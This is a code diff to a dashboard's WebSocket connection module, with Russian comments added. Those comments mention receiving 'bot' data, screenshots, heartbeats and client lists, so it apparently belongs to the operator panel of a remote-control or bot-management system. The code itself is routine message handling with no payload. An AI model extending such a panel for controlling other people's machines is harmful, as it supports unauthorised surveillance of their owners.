@@ -1,4 +1,4 @@
-// frontend/dashboard/js/modules/websocket/connection.js
+/* frontend/dashboard/js/modules/websocket/connection.js */
 import { updateClient, updateClients } from '../data/clients.js';
 import { decodePacket, encodePacket, isJson } from './protocol.js';
 
@@ -16,7 +16,8 @@ export function connectWebSocket() {
 
     ws.onopen = () => {
         console.log("[WS] Connected");
-        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("0", "ping")), 25000);
+        // Пинг-понг для поддержания соединения
+        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("SERVER", "ping")), 25000);
     };
 
     ws.onmessage = ({ data }) => {
@@ -28,16 +29,24 @@ export function connectWebSocket() {
             return window.location.reload();
         }
 
+        // Если модуль в списке JSON или это ответ от сервера
         if (isJson(pkg.module)) {
             try {
-                const rawData = JSON.parse(new TextDecoder().decode(pkg.payload));
-                if (pkg.module === 'ClientList') {
-                    updateClients(rawData);
+                const decodedText = new TextDecoder().decode(pkg.payload);
+                const rawData = JSON.parse(decodedText);
+
+                // Если пришел список или данные бота
+                if (pkg.module === 'ClientList' || Array.isArray(rawData)) {
+                    updateClients(Array.isArray(rawData) ? rawData : [rawData]);
                 } else {
+                    // Обработка данных бота (DataScribe или другие)
                     updateClient({ ...rawData, id: rawData.id || pkg.id }, rawData.net === 'heartbeat');
                 }
-            } catch (e) { console.error("[WS] JSON Error:", e); }
+            } catch (e) {
+                console.error("[WS] JSON Parse Error in module:", pkg.module, e);
+            }
         } else {
+            // Для сырых бинарных данных (скриншоты и т.д.)
             window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
         }
     };
@@ -47,7 +56,7 @@ export function connectWebSocket() {
             localStorage.clear();
             window.location.href = '/sidebar/auth/auth.html';
         } else {
-            setTimeout(connectWebSocket, 5000);
+            setTimeout(connectWebSocket, 5000); // Авто-реконнект
         }
     };
 
